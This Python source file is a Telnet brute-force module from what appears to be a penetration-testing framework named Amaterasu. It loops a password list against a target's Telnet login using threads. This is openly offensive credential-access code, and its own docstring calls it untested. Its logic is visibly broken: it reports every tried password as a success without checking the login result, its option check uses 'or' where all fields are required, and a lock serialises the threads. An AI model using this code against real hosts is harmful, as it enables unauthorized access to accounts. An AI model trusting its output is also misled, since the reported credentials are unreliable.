#!/usr/bin/env python3
#coding: utf-8
# Amaterasu project

'''
TELNETBRUTEFORCE MODULE NEED TO BE
TESTED, SO, IT IS NOT GOING TO
BE IN THE NEXT RELEASE.
'''

import argparse
import cmd2
import telnetlib
from typing import Optional
from huepy import *
import time
import concurrent.futures
from threading import Lock

from lib.opt_data import *
from lib.checksettings import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('TARGET', help='target help')
parser_target.add_argument('TARGET', type=str)

parser_username = set_subparsers.add_parser('USERNAME', help='set username to use in the bruteforce')
parser_username.add_argument('USERNAME', type=str)

parser_passwords = set_subparsers.add_parser('PASS_FILE', help='set passwords file to use to bruteforce')
parser_passwords.add_argument('PASS_FILE', type=str)

parser_verbose = set_subparsers.add_parser('VERBOSE', help='set True if you want to see what accounts failed')
parser_verbose.add_argument('VERBOSE', type=bool)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

class TelnetBruteforce(cmd2.Cmd):
	def __init__(self):
		# terminal lock
		super().__init__()

		self.target = None
		self.username = None
		self.verbose = False
		self.passwords = None

		self.metadata = {'Description'	: 'Bruteforce Telnet services.',
						'Author'	 	: 'Sam Marx <sam-marx[at]protonmail.com>',
						'Version'	 	: '1.0',
		}

		Options = Opt()
		Options.new(name='TARGET', current_setting=self.target, required=True, description="Target's IP address")
		Options.new(name='USERNAME', current_setting=self.username, required=True, description='Username to use in bruteforce attack')
		Options.new(name='VERBOSE', current_setting=self.verbose, required=False, description='set True if you want to see what accounts failed')
		Options.new(name='PASS_FILE', current_setting=self.passwords, required=True, description='Password file to use in the bruteforce.')

		self.prompt = 'amaterasu[credential_access/telnet_bruteforce]> '
		self.intro = f'{lightblue("Provided by:")}\n{self.metadata["Author"]}\n\n'
		self.intro += f'{lightblue("Description:")}\n{self.metadata["Description"]}\n\n'
		self.intro += f'{lightblue("Options:")}\n{Options.create_table()}\n'

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'TARGET: {self.target}\nUSERNAME: {self.username}\nPASS_FILE: {self.passwords}\nVERBOSE: {self.verbose}')

	def set_target(self, args):
		self.target = args.TARGET
		print(info(f'TARGET set: {self.target}'))

	def set_verbose(self, args):
		self.verbose = args.VERBOSE
		print(info(f'VERBOSE set: {self.verbose}'))

	def set_username(self, args):
		self.username = args.USERNAME
		print(info(f'USERNAME set: {self.username}'))

	def set_passwords(self, args):
		self.passwords = args.PASS_FILE
		print(info(f'PASS_FILE set: {self.passwords}'))

	parser_target.set_defaults(func = set_target)
	parser_username.set_defaults(func = set_username)
	parser_passwords.set_defaults(func = set_passwords)
	parser_verbose.set_defaults(func = set_verbose)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		futures = []

		try:
			if self.target is not None or self.username is not None or self.passwords is not None:
				lock = Lock()
				print(info(f'{"Banner":20}{checkSettings().get_banner(self.target, 23)}'))

				passwords = open(self.passwords).readlines()

				with concurrent.futures.ThreadPoolExecutor(len(passwords) + 20) as executor:
					for password in passwords:
						executor.submit(self.bruteforce, lock, self.target, self.username, password.strip(), self.verbose)
			else:
				print(bad('You have to set a TARGET, a USERNAME and PASS_FILE.'))
		except Exception as e:
			print(bad(f'Thread error: {e}'))

	def bruteforce(self, lock, target: str, username: str, password: str, verbose: Optional[bool] = False) -> None:
		with lock:
			try:
				telnet = telnetlib.Telnet(target)
				telnet.read_until(b'login: ')

				telnet.write(username.encode('ascii') + b'\n')
				telnet.read_until(b'Password: ')
				telnet.write(password.encode('ascii') + b'\n')

				print(good(f'Username: \t{username}'))
				print(good(f'Password: \t{password}'))
			except:
				if verbose:
					print(bad(f'Username: \t{username}'))
					print(bad(f'Password: \t{password}'))
			finally:
				telnet.write(b'exit\n')